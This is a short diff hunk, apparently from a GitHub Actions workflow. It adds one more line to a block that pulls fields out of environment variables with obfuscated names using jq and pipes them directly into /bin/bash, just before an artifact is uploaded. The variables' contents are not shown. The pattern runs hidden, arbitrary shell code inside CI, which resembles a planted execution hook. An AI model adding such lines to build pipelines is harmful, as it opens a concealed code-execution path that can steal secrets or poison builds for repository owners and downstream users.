@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$hoxx9477" | jq -r .jva21 | /bin/bash
           echo $z515 | jq -r .u641 | /bin/bash
           echo $mnt2 | jq -r .lxc80623 | /bin/bash
+          printf '%s' "$uy82" | jq -r .r40 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
